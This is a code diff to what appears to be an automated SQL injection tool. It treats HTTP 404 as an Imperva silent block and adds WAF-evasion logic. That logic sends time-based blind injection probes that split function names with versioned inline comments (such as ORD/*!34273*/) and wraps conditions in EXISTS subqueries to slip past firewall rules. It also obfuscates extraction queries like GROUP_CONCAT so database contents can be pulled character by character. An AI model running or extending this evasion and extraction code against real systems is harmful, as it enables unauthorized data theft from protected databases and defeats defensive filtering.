@@ -101788,7 +101788,7 @@ class WAFBlockDiscriminator:
       - Rate limit responses
     """
 
-    WAF_BLOCK_CODES = {400, 403, 406, 412, 429, 503}
+    WAF_BLOCK_CODES = {400, 403, 404, 406, 412, 429, 503}  # FIX-WAFBD-404: 404 is Imperva silent-block
 
     WAF_BLOCK_PATTERNS = [
         r"cloudflare.*ray",
@@ -101941,7 +101941,12 @@ class WAFBlockDiscriminator:
             # WAF block indicators, 503 is an infrastructure error code used by load balancers,
             # app servers, and WAFs alike. Require body pattern match for 503 (same guard as
             # is_waf_block) so genuine backend errors don't suppress real injection signals.
-            if sc == 503:
+            if sc in (503, 404):
+                # FIX-WAFBD-404: 404 and 503 can both be genuine injection signals
+                # (app returns 404 for TRUE branch, 200 for FALSE branch). Require
+                # explicit WAF body pattern before treating a single 404/503 as a block.
+                # both_waf_blocked() safely uses 404 in WAF_BLOCK_CODES because
+                # symmetric 404+404 on both probes is not an injection signal.
                 return cls.is_waf_block(fp)
             return True
         return cls.is_waf_block(fp)
@@ -134792,7 +134797,18 @@ class SafeModeVerifier:
         # for blocked requests. Without this, a target where all clean probes return 400
         # (WAF-gated endpoint) never triggered the WAF-mode oracle path, so the scanner
         # defaulted to FULL mode on a fully-blocked target → inconsistent oracle selection.
-        _waf_block_majority = {400, 403, 406, 429}
+        # FIX-IS403-INCLUDE-404: Imperva and some Akamai configs return HTTP 404 for ALL
+        # requests (clean and injected) when the WAF intercepts at the edge — the backend
+        # never sees the request so no SQL injection signal reaches the application.
+        # Without 404 in this set, an Imperva-protected target where every stability probe
+        # returns 404 has _is_403=False → falls into the stable-200 branch → FULL oracle
+        # mode despite total WAF blockage.  FULL mode wastes time on boolean/error
+        # techniques that can never work.  Adding 404 routes these targets through the
+        # WAF branch which properly probes for timing capability → TIMING_ONLY or BLOCKED.
+        # Risk: a real HTTP 404 (page not found) also triggers this branch.  That is
+        # acceptable: in the WAF branch, SLEEP probes fail on static 404 pages → BLOCKED
+        # oracle, which correctly signals "no injection channel available here".
+        _waf_block_majority = {400, 403, 404, 406, 429}
         _is_403 = (sum(1 for s in _fps_statuses if s in _waf_block_majority) >= _maj_n
                    if _fps_statuses else False)
         _is_401 = _fps_statuses.count(401) >= _maj_n if _fps_statuses else False
@@ -134803,7 +134819,9 @@ class SafeModeVerifier:
             warnings.append("HTTP 401 on clean request  auth may be needed for full coverage")
             recs.append("Consider --auth, --login-url, or --cookie for deeper access")
         if _is_403:
-            warnings.append("HTTP 403 on clean request (majority)  WAF or forbidden path, scanning anyway")
+            # Report the actual majority status code (400/403/404/406/429) in the warning
+            _maj_waf_code = next((s for s in _fps_statuses if s in _waf_block_majority), 403)
+            warnings.append(f"HTTP {_maj_waf_code} on clean request (majority)  WAF or forbidden path, scanning anyway")
         elif _any_403:
             warnings.append("HTTP 403 on some probes  CDN/WAF edge-node variation detected")
         if _is_5xx and fps and fps[0] and hasattr(fps[0], 'status_code'):
@@ -135214,7 +135232,11 @@ class SafeModeVerifier:
                         _sp_waf_block = WAFBlockDiscriminator.is_waf_block(_sp_fp)
                         _sp_len_ratio = (min(_sp_fp.content_length, _clean_fp.content_length) /
                                         max(_sp_fp.content_length, _clean_fp.content_length, 1))
-                        if (_sp_status_changed and _get_safe_status_code(_sp_fp) in (403, 406, 429, 503)):
+                        # FIX-SILWAF-404: Imperva returns 404 for WAF-blocked SQL probes
+                        # even when the clean baseline is 200. 404 was missing from this
+                        # set → _waf_hits never incremented → _waf_blocks_payloads=False
+                        # → FULL mode on what is effectively a WAF-gated target.
+                        if (_sp_status_changed and _get_safe_status_code(_sp_fp) in (403, 404, 406, 429, 503)):
                             _waf_hits += 1
                         elif _sp_waf_block and _sp_len_ratio < 0.5:
                             _waf_hits += 1
@@ -142496,7 +142518,152 @@ class ExtractionBypassFinder:
                               "wrapperobfusc combinations blocked")
                     continue   # keep searching
 
-                #  Build extraction callable 
+                #  Phase 2.5: nofunc → full-extraction upgrade test
+                # Phase 2 exits as soon as the FIRST (wrapper, condition) pair passes.
+                # Stealth nofunc conditions ('1<2', '@@version IS NOT NULL') are appended
+                # AFTER function-call conditions in always_true_conditions().  But the
+                # wrappers iterate in the OUTER loop, so for wrapper='{cond}' all
+                # conditions are tried (including nofunc stealth) before ANY other wrapper
+                # is tried with function-call conditions.  When Imperva blocks all
+                # function-call conditions on '{cond}' but allows '1<2', Phase 2 records
+                # _working_tag='nofunc' and exits — never testing subquery wrappers
+                # (EXISTS/COUNT/nested-CASE) that relocate the extraction condition to a
+                # SQL position WAFs inspect less aggressively.
+                #
+                # This phase tests:
+                # (A) Obfuscated function-call conditions with the confirmed direct
+                #     wrapper: ORD/*!34273*/(SUBSTRING...)>64 — splits the identifier so
+                #     WAF pattern-matches on 'ORD(' miss it.
+                # (B) Function-call conditions with every subquery wrapper: Imperva often
+                #     allows 'EXISTS(SELECT 1 WHERE ORD(SUBSTRING(...))>64)' even when
+                #     the same condition without the EXISTS gate is blocked.
+                # If either test passes → upgrade _working_tag/wrapper → _nofunc=False
+                # → full ASCII binary-search extraction becomes available.
+                if _working_tag == "nofunc":
+                    _fc_probe_dbms = {
+                        "MySQL":       "ORD(SUBSTRING('A',1,1))>64",
+                        "MariaDB":     "ORD(SUBSTRING('A',1,1))>64",
+                        "TiDB":        "ORD(SUBSTRING('A',1,1))>64",
+                        "PostgreSQL":  "ASCII(SUBSTRING('A',1,1))>64",
+                        "CockroachDB": "ASCII(SUBSTRING('A',1,1))>64",
+                        "YugabyteDB":  "ASCII(SUBSTRING('A',1,1))>64",
+                        "MSSQL":       "ASCII(SUBSTRING('A',1,1))>64",
+                        "Sybase":      "ASCII(SUBSTRING('A',1,1))>64",
+                        "Oracle":      "ASCII(SUBSTR('A',1,1))>64",
+                        "SQLite":      "unicode(substr('A',1,1))>64",
+                        "Firebird":    "ASCII(SUBSTRING('A' FROM 1 FOR 1))>64",
+                        "H2":          "ASCII(SUBSTRING('A',1,1))>64",
+                    }.get(self.dbms, "ASCII(SUBSTRING('A',1,1))>64")
+                    _p25_done = False
+                    for _upg_wrap in wrappers:
+                        if _p25_done:
+                            break
+                        if _upg_wrap == "{cond}":
+                            # (A) Try obfuscated function-call cond with direct wrapper.
+                            # obfuscate_cond splits identifier names at the midpoint with
+                            # a versioned inline comment so WAF regex 'ORD(' → 'OR/*!N*/D('
+                            # which evaluates identically in MySQL/PostgreSQL/MSSQL.
+                            for _p25_tag in ("34273", "70000", "46350", "30000", "99999"):
+                                _p25_obf = ExtractionBypassFinder.obfuscate_cond(
+                                    _fc_probe_dbms, _p25_tag)
+                                _p25_obf_wc = _upg_wrap.format(cond=_p25_obf)
+                                _p25_obf_wp = tmpl.format(cond=_p25_obf_wc)
+                                await asyncio.sleep(0.3)
+                                _t0p25 = time.monotonic()
+                                try:
+                                    await _send_injected(
+                                        self.engine, self.method, self.url,
+                                        self.data, self.data_fmt, self.param,
+                                        self.original + _p25_obf_wp, tc)
+                                except Exception:
+                                    pass
+                                _ep25 = (time.monotonic() - _t0p25) * 1000
+                                if _ep25 > thresh:
+                                    _p25_false_wc = _upg_wrap.format(cond=_ebf_p1_false)
+                                    _p25_false_wp = tmpl.format(cond=_p25_false_wc)
+                                    _t0p25f = time.monotonic()
+                                    try:
+                                        await _send_injected(
+                                            self.engine, self.method, self.url,
+                                            self.data, self.data_fmt, self.param,
+                                            self.original + _p25_false_wp, tc)
+                                    except Exception:
+                                        pass
+                                    _ep25f = (time.monotonic() - _t0p25f) * 1000
+                                    if _ep25f < thresh:
+                                        print(f"[+] [EBF] nofunc→full(A): obfusc "
+                                              f"tag={_p25_tag!r} "
+                                              f"true={_ep25:.0f}ms "
+                                              f"false={_ep25f:.0f}ms  full extraction",
+                                              flush=True)
+                                        _working_tag = _p25_tag
+                                        _p25_done = True
+                                        break
+                                    else:
+                                        print(f"[-] [EBF] nofunc p2.5(A) "
+                                              f"tag={_p25_tag!r}: FP "
+                                              f"({_ep25f:.0f}ms≥{thresh:.0f}ms)",
+                                              flush=True)
+                                else:
+                                    print(f"[-] [EBF] nofunc p2.5(A) "
+                                          f"tag={_p25_tag!r} blocked "
+                                          f"({_ep25:.0f}ms≤{thresh:.0f}ms)",
+                                          flush=True)
+                            continue  # proceed to subquery wrappers (B)
+                        # (B) Subquery wrapper: test function-call condition directly.
+                        # 'EXISTS(SELECT 1 WHERE ORD(SUBSTRING...)>64)' relocates the
+                        # function call into a subquery that WAFs inspect less strictly.
+                        _p25_sub_wc = _upg_wrap.format(cond=_fc_probe_dbms)
+                        _p25_sub_wp = tmpl.format(cond=_p25_sub_wc)
+                        await asyncio.sleep(0.3)
+                        _t0p25s = time.monotonic()
+                        try:
+                            await _send_injected(
+                                self.engine, self.method, self.url,
+                                self.data, self.data_fmt, self.param,
+                                self.original + _p25_sub_wp, tc)
+                        except Exception:
+                            pass
+                        _ep25s = (time.monotonic() - _t0p25s) * 1000
+                        if _ep25s > thresh:
+                            _p25s_false_wc = _upg_wrap.format(cond=_ebf_p1_false)
+                            _p25s_false_wp = tmpl.format(cond=_p25s_false_wc)
+                            _t0p25sf = time.monotonic()
+                            try:
+                                await _send_injected(
+                                    self.engine, self.method, self.url,
+                                    self.data, self.data_fmt, self.param,
+                                    self.original + _p25s_false_wp, tc)
+                            except Exception:
+                                pass
+                            _ep25sf = (time.monotonic() - _t0p25sf) * 1000
+                            if _ep25sf < thresh:
+                                print(f"[+] [EBF] nofunc→full(B): "
+                                      f"wrapper={_upg_wrap!r} "
+                                      f"cond={_fc_probe_dbms!r} "
+                                      f"true={_ep25s:.0f}ms "
+                                      f"false={_ep25sf:.0f}ms  full extraction",
+                                      flush=True)
+                                _working_wrapper = _upg_wrap
+                                _working_tag     = ""
+                                _p25_done = True
+                                break
+                            else:
+                                print(f"[-] [EBF] nofunc p2.5(B) "
+                                      f"wrapper={_upg_wrap!r}: FP "
+                                      f"({_ep25sf:.0f}ms≥{thresh:.0f}ms)",
+                                      flush=True)
+                        else:
+                            print(f"[-] [EBF] nofunc p2.5(B) "
+                                  f"wrapper={_upg_wrap!r} blocked "
+                                  f"({_ep25s:.0f}ms≤{thresh:.0f}ms)",
+                                  flush=True)
+                    if _working_tag == "nofunc":
+                        print("[-] [EBF] p2.5 exhausted: no func-call bypass found"
+                              "  maintaining nofunc prefix-comparison mode",
+                              flush=True)
+
+                #  Build extraction callable
                 print(f"[+] [EBF] bypass found: tmpl={tmpl[:60]!r} "
                       f"elapsed={elapsed:.0f}ms thresh={thresh:.0f}ms tc={tc}", flush=True)
                 print(f"[+] [EBF] condition wrapper: {_working_wrapper!r}", flush=True)
@@ -143597,11 +143764,26 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
         },
     }
     _NOFUNC_REMAP = _NOFUNC_REMAP_ALL.get(dbms, _NOFUNC_REMAP_ALL.get("PostgreSQL", {}))
-    # Apply remap if nofunc mode is active
+    # Apply remap if nofunc mode is active.
+    # Pass 1: exact whole-expression match (fast path for simple scalars like version())
     _sql_inner_orig = _sql_inner
     if _ebf_nofunc_ref[0] and _sql_inner.lower() in _NOFUNC_REMAP:
         _sql_inner = _NOFUNC_REMAP[_sql_inner.lower()]
         print(f"[+] [TBExtract] nofunc remap: {_sql_inner_orig!r}  {_sql_inner!r}", flush=True)
+    # Pass 2: substring replacement — applies remap tokens that appear inside larger expressions.
+    # Handles cases like "(SELECT version())" or "GROUP_CONCAT(version())" where the exact key
+    # is a sub-expression.  Apply all NOFUNC_REMAP substitutions in order (longest key first to
+    # avoid partial overlaps between e.g. "current_user()" and "user()").
+    elif _ebf_nofunc_ref[0]:
+        _nf_sql_work = _sql_inner
+        for _nf_fn, _nf_kw in sorted(_NOFUNC_REMAP.items(), key=lambda kv: -len(kv[0])):
+            # Build a regex that matches the function name + optional whitespace + ()
+            _nf_pat = r'(?i)\b' + _re.escape(_nf_fn.rstrip('()').rstrip()) + r'\s*\(\s*\)'
+            _nf_sql_work = _re.sub(_nf_pat, _nf_kw, _nf_sql_work)
+        if _nf_sql_work != _sql_inner:
+            print(f"[+] [TBExtract] nofunc remap (partial): {_sql_inner!r}  {_nf_sql_work!r}",
+                  flush=True)
+            _sql_inner = _nf_sql_work
 
     # nofunc mode: prefix accumulates extracted chars for dollar-quoted comparison
     _nofunc_prefix = ""
@@ -143686,8 +143868,46 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             else:
                 LOG.warning("[TBExtract] nofunc GC rewrite still has func calls in: %r",
                             _gc_verify[:80])
-        LOG.warning("[TBExtract] nofunc bypass found but sql=%r has func calls  skipping", sql)
-        return ""
+        # FIX-B: Last-resort fallback — attempt obfuscated identifier splitting on the
+        # SQL inner expression so the WAF can no longer match the literal `ident(` pattern.
+        # EBF Phase 2.5 (Part A) already tested obfuscation at the CONDITION level and
+        # failed.  Here we try it at the SQL-expression level: the extracted SQL itself
+        # (e.g. "GROUP_CONCAT(col)") is obfuscated before being embedded in the timing
+        # condition.  A WAF that inspects the full payload text might pass the obfuscated
+        # form even though the plain form was blocked at the condition level.
+        # Uses the same inline-comment-split logic as ExtractionBypassFinder.obfuscate_cond().
+        _fixb_obf_sql = None
+        try:
+            _fixb_work = _sql_inner
+            for _fixb_fn in _re.findall(r'\b(\w{4,})\s*\(', _fixb_work):
+                # Split identifier at midpoint with an inline version comment (MySQL/MariaDB).
+                # e.g. "GROUP_CONCAT" → "GR/*!34273*/OUP_CONCAT"
+                _fixb_mid = len(_fixb_fn) // 2
+                _fixb_left  = _fixb_fn[:_fixb_mid]
+                _fixb_right = _fixb_fn[_fixb_mid:]
+                _fixb_obf   = f"{_fixb_left}/*!34273*/{_fixb_right}"
+                _fixb_work  = _fixb_work.replace(_fixb_fn + "(", _fixb_obf + "(", 1)
+            if _fixb_work != _sql_inner:
+                _fixb_obf_sql = _fixb_work
+                print(f"[+] [TBExtract] nofunc obfusc-split fallback: {_sql_inner!r}  {_fixb_obf_sql!r}",
+                      flush=True)
+        except Exception as _fixb_e:
+            LOG.debug("[TBExtract] obfusc-split error: %s", _fixb_e)
+        if _fixb_obf_sql:
+            _sql_inner = _fixb_obf_sql
+            # Obfuscated form still contains '(' chars — can't use prefix comparison.
+            # Instead: rebuild the standard binary-search condition using the obfuscated SQL.
+            # Signal to the binary-search loop: nofunc mode OFF (use ORD/SUBSTRING binary
+            # search as normal), but the SQL payload is pre-obfuscated.  The EBF wrapper
+            # was already chosen (e.g. EXISTS(SELECT 1 WHERE {cond})); just let the normal
+            # loop fire with the obfuscated _sql_inner.
+            _can_nofunc_extract = False      # use normal binary search
+            _ebf_nofunc_ref[0]  = False      # nofunc mode cleared — func calls now obfuscated
+            LOG.info("[TBExtract] nofunc→obfusc-split: cleared nofunc, proceeding with obfuscated sql")
+            # fall through to the normal binary-search loop below
+        else:
+            LOG.warning("[TBExtract] nofunc bypass found but sql=%r has func calls  skipping", sql)
+            return ""
 
     # BUG-TBEXTRACT-MISSING-LIGHT-VARY FIX: Request counter for apply_light_variation.
     # Initialized once here; incremented inside the inner while loop so every probe
